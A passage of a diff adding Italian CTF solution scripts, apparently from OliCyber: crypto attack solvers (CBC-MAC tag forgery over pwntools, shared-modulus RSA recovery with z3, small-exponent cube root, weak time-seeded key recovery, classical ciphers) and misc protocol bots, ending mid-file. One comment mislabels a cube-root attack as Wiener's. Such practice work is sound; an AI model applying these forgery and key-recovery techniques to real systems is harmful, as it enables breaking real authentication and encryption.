11533478320221726260579640234629942318235499494819282592707750949879377838153010591699870387733922335237346601688052059159711330257768224077404011307065502, 4976972096947215995604250302120022863724895715346083646855543963329247781262451899029118643158061394120410879487993483866284176498327793885573656815959625, 4681912725673019871443561451419395066053419376607563995366260416152571052501135318936871569982910442869454288025059773463637103183173901939380864464743507, 11533478320221726260579640234629942318235499494819282592707750949879377838153010591699870387733922335237346601688052059159711330257768224077404011307065502, 8940773031260128816353055588056553762174304755194627122656101231849888146723299412495411641543320104568844524323442721074997637332927564813921786500578783, 11423510528481254653722753030443951375438327975061847006552200116842671491412197269348216405017375323023103748474060309270443583040889846090306674187220123, 7417749460829589872125015470473215663301512126557338249364767880097167628946787955886428357239009748621520124971407149634165113201860416364735206568534983, 8726361200928671469895309795311953939907207829055317813772040351606093030953303162108723050724434523055468294271626869389754617053082826339689136742130108, 11423510528481254653722753030443951375438327975061847006552200116842671491412197269348216405017375323023103748474060309270443583040889846090306674187220123, 10263048253606984297123478724549603022911190452564582984819673374864047714844730108530907695117857268312227035665259970999887200163673802445141625430514814, 7417749460829589872125015470473215663301512126557338249364767880097167628946787955886428357239009748621520124971407149634165113201860416364735206568534983, 11423510528481254653722753030443951375438327975061847006552200116842671491412197269348216405017375323023103748474060309270443583040889846090306674187220123, 10263048253606984297123478724549603022911190452564582984819673374864047714844730108530907695117857268312227035665259970999887200163673802445141625430514814, 2763933001803204486404977590428655070374645166799194564837051268540673808019656414872574657154244285031674815061739570475906120714339949094699925206973605, 8726361200928671469895309795311953939907207829055317813772040351606093030953303162108723050724434523055468294271626869389754617053082826339689136742130108, 6815947336659824779195428243794677536273796347974540155087174021542202027112580398956449226750698039076818006188092726964024729540059945989096449057834588, 10263048253606984297123478724549603022911190452564582984819673374864047714844730108530907695117857268312227035665259970999887200163673802445141625430514814, 7417749460829589872125015470473215663301512126557338249364767880097167628946787955886428357239009748621520124971407149634165113201860416364735206568534983, 8333734799339493559678955789619922158298739024487455613439873912214855006300104663941336615744988157011795176947319756925896272388708377718259312920347105, 10263048253606984297123478724549603022911190452564582984819673374864047714844730108530907695117857268312227035665259970999887200163673802445141625430514814, 8940773031260128816353055588056553762174304755194627122656101231849888146723299412495411641543320104568844524323442721074997637332927564813921786500578783, 6284846751767392184771017395810689449703790083582134540966884439997965107203503721721565646758267656378167370179394322876635680275943164791150881151397508, 5156750795121096005286481831243300939236934700546846606275954309489260380956137146037448251518456858441169348352256134117553444268716688546022091198082045]
+for i in c:
+    for j in string.printable:
+        cipher = pow(ord(j), e, n)
+        if cipher == i:
+            print(j, end="")
+            break
+print()
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/SandwichMaster.py">
+#!/usr/bin/env python3
+from pwn import *
+
+r = remote("sandwichmaster.challs.olicyber.it", 30996)
+
+msg = b'Im so good with sandwiches they call me mr Krabs'
+
+r.sendlineafter(b'> ', b'1')
+r.sendlineafter(b'gimme m: ', b'00'*16)
+r.recvuntil(b'= \'')
+tag = bytes.fromhex(r.recvline()[:-2].decode())
+
+p = b'00' * 16 + xor(msg[:16], tag[:16]).hex().encode() + msg[16:].hex().encode()
+r.sendlineafter(b'> ', b'1')
+r.sendlineafter(b'gimme m: ', p)
+r.recvuntil(b'= \'')
+tag = bytes.fromhex(r.recvline()[:-2].decode())
+r.sendlineafter(b'> ', b'2')
+r.sendlineafter(b'gimme your tag: ', tag.hex().encode())
+print(r.recvline().strip().decode())
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/SecureKeyGenerator.py">
+from datetime import datetime
+from Crypto.Util.number import *
+from hashlib import sha256
+from itertools import cycle
+import random
+
+# 2021-03-21 17:37:40
+def int_to_bytes(x):
+    return x.to_bytes((x.bit_length() + 7) // 8, 'big')
+
+def int_from_bytes(xbytes):
+    return int.from_bytes(xbytes, 'big')
+
+def generate_secure_key():
+    time = int(datetime.timestamp(datetime(2021, 3, 21, 17, 37, 40)))
+    h = sha256(int_to_bytes(time)).digest()
+    seed = int_from_bytes(h[32:])
+    key = h[:32]
+    random.seed(seed)
+    for _ in range(32):
+        key += bytes([random.randint(0, 255)])
+    return key
+
+def xor(ba1, ba2):
+    return bytes([_a ^ _b for _a, _b in zip(ba1, cycle(ba2))])
+
+#sys.set_int_max_str_digits(10000000)
+key = generate_secure_key()
+byte = open("flag.enc", "rb").read()
+file = open("file.pdf", "wb").write(xor(byte,key))
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/SimilarKeyBigProblem.py">
+#!/usr/bin/env python3
+from Crypto.Util.number import *
+import libnum
+from math import sqrt
+from z3 import *
+
+N_a = 11854178668350132536998770600021775412418919136267711466659575504833480429106340292308672916005731985811172925720279068992464220293573546887342858910065901
+e_a = 65537
+d_a = 2454147980105506786425977989549345389561620074780357800626167210119179432413932079707729534686888191626633148799840568097408265451820012752747703117155329
+
+N_b = 11854178668350132536998770600021775412418919136267711466659575504833480429106340292308672916005731985811172925720279068992464220293573546887342858910065901
+e_b = 5
+ct_b = 11221865015245352586827949926936479339872912906868036678060873700351121339721754353868819679643501748382626251386036804928304376365191637409698833040968724
+
+assert N_a == N_b
+d_b = Int('d_b')
+phi = Int('phi')
+s = Solver()
+s.add(phi > int(pow(N_a, 1/2)))
+s.add((d_a * e_a) % phi == 1)
+s.add((d_b * e_b) % phi == 1)
+print(s.check())
+m = s.model()
+print(m[phi].as_long())
+print(long_to_bytes(pow(ct_b, m[d_b].as_long(), N_a)).decode())
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/SmallRSA.py">
+#!/usr/bin/env python3
+from Crypto.Util.number import *
+import gmpy2
+
+n = 121188535871798118811428322495136173485838157702837603009744079502828661170574654643712519826693731103670617468427120197687519224611728159372629028899279680740201176466228593180097000630667826923128885153190352359299571456927587933797154384731664367396394374086703053646510220882981791309024543386831488440013
+n = hex(n)
+e = 3 # Wiener's attack
+cipher = 56274920108133183710879347789095782313165243853788407193317419375243717146801757114129876005705242550492379484281774120724787040219649340446091878053221949541
+
+#f = open('cipher','rb')
+#cipher = int(f.read().encode('hex'),16)
+with gmpy2.local_context(gmpy2.context(), precision=800) as ctx:
+    ctx.precision += 800
+    root = gmpy2.cbrt(cipher)
+
+print(long_to_bytes(int(root)).decode())
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/TutteLeStradePortanoARoma.py">
+flag = "cixd{xsb_zxbpxo_jlofqrof_qb_pxirqxkq}"
+shift = ord('f') - ord('c')
+for i in flag:
+    if i == '{' or i == '}' or i == '_':
+        print(i, end="")
+        continue
+    else:
+        print(chr(((ord(i)+shift)-ord('a'))%26+ord('a')), end="")
+</file>
+
+<file path="Challenges 🕹️/Crittografia 🔑/VeryStrongVigenere.py">
+flag = "fzau{ncn_isors_cviovw_pwcqoze}"
+flag1 = "flag"
+d = [0, 0, 0, 0]
+for i in range(4):
+    d[i] = abs(ord(flag[i])-ord(flag1[i]))
+flag1 = ""
+print(d) # si nota che la chiave si ripete 0,14 ed è quindi formata da due caratteri
+b = True
+for i in flag:
+    if i == '{' or i == '}' or i == '_':
+        flag1 += i
+    elif b:
+        flag1 += i # lo shift è di 0
+        b = False
+    else:
+        flag1 += chr((ord(i)-ord('a')-14) % 26 + ord('a')) # lo shift è di 14
+        b = True
+print(flag1)
+</file>
+
+<file path="Challenges 🕹️/Miscellaneous 🎯/2048.py">
+# pip3 install pwntools
+from pwn import remote, context
+import re
+
+r = remote("2048.challs.olicyber.it", 10007)
+context.timeout = 1
+sos = r.recv()
+context.log_level = 'debug'
+
+for i in range(2049):
+    print(str(sos))
+    if "DIVISIONE_INTERA" in str(sos):
+        s = [int(s) for s in re.findall(r'-?\d+\.?\d*', str(sos))]
+        t = s[0] // s[1]
+        r.sendline(str(t))
+    elif "SOMMA" in str(sos):
+        s = [int(s) for s in re.findall(r'-?\d+\.?\d*', str(sos))]
+        t = sum(s)
+        r.sendline(str(t))
+    elif "DIFFERENZA" in str(sos):
+        s = [int(s) for s in re.findall(r'-?\d+\.?\d*', str(sos))]
+        t = s[0] - s[1]
+        r.sendline(str(t))
+    elif "PRODOTTO" in str(sos):
+        s = [int(s) for s in re.findall(r'-?\d+\.?\d*', str(sos))]
+        t = s[0] * s[1]
+        r.sendline(str(t))
+    elif "POTENZA" in str(sos):
+        s = [int(s) for s in re.findall(r'-?\d+\.?\d*', str(sos))]
+        t = s[0] ** s[1]
+        r.sendline(str(t))
+    sos = r.recv()    
+print(str(sos))
+</file>
+
+<file path="Challenges 🕹️/Miscellaneous 🎯/BasedAndEncoded.py">
+#!/usr/bin/env python3
+
+from pwn import *
+from base64 import b64decode, b64encode
+import re
+
+r = remote("based.challs.olicyber.it", 10600)
+r.recvuntil(b'\n\n')
+
+def bin_to_str(x):
+    ''' Copiata lol '''
+    my_int = int(x, base=2)
+    my_str = my_int.to_bytes((my_int.bit_length() + 7)//8, 'big')
+    return my_str
+
+while True:
+	t = r.recv(1000).decode()
+	print(t)
+	if 'da base64' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		r.sendline(b'{"answer": "' +  b64decode(j["message"].encode()) + b'"}')
+	elif 'da esadecimale' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		r.sendline(b'{"answer": "' + bytes.fromhex(j["message"]) + b'"}')
+	elif 'da binario' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		r.sendline(b'{"answer": "' + bin_to_str("0b"+j["message"]) + b'"}')
+	elif 'a base64' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		r.sendline(b'{"answer": "' + b64encode(j["message"].encode()) + b'"}')
+	elif 'a esadecimale' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		r.sendline(b'{"answer": "' + j["message"].encode().hex().encode() + b'"}')
+	elif 'a binario' in t:
+		t = t.split('\n')
+		j = eval(t[1])
+		binstr = ''.join(format(ord(i), '08b') for i in j["message"])
+		if binstr[0] != '1':
+			for i in range(len(binstr)):
+				if binstr[i] == '1':
+					binstr = binstr[i:]
+					break
+		r.sendline(b'{"answer": "' +  binstr.encode() + b'"}')
+	else:
+		print("skill issue", t)
+	flag = r.recvuntil(b'\n\n')
+	if b'flag' in flag.lower():
+		print(flag)
+		break
+</file>
+
+<file path="Challenges 🕹️/Miscellaneous 🎯/BelPaessaggio.md">
+Per risolvere questa chall bisogna sapere che i gif sono un insieme di frame ripetuti in loop e quindi (vedendo anche i metadati del file dato dalla chall) capiamo che bisogna dividere i frame usando il tool per linux "graphicsmagick", con il comando: <p><code>gm convert b
+
+... [TRUNCATED TO PREVENT API QUOTA EXCEEDED] ...
